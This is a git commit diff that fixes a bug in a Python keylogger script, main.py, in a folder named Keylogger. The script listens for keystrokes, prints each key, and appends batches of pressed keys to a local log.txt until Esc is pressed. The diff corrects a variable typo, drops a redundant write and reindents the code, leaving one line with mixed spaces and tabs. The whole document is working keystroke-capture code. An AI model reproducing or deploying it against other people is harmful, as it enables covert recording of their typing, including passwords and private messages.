543b83d8f144683bbd35c1b21273307f469a383c
Sukarayam Janjua <94704551+SukarayamJanjua@users.noreply.github.com>
2022-10-05 00:27:57 +0530

    Fixed bug in main.py

--- Keylogger/main.py
+++ Keylogger/main.py
@@ -6,29 +6,29 @@ count = 0
 keys = []
 
 def on_press(key):
-    global keys, count
-    keys.append(key)
-    count +=1
-    print("{0} pressed".format(key))
+	global keys, count
+	keys.append(key)
+	count +=1
+	print("{0} pressed".format(key))
 
-    if count >= 10:
-        count =0
-        write_file(keys)
-        keys = []
+	if count >= 10:
+		count = 0
+		write_file(keys)
+		keys = []
 
 def write_file(keys):
-    with open("log.txt","a") as f:
-        for key in keys:
-            k = str(key).replace("'","")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif f.find("Key") == -1:
-                f.write(k)
-            f.write(str(key))
+	with open("log.txt", "a") as f:
+		for key in keys:
+			k = str(key).replace("'","")
+			if k.find("space") > 0:
+				f.write('\n')
+			elif k.find("Key") == -1:
+				f.write(k)
+			
 
 def on_release(key):
-    if key == Key.esc:
-        return False
+	if key == Key.esc:
+        	return False
 
 with Listener(on_press=on_press,on_release=on_release) as listener:
-    listener.join()
+	listener.join()
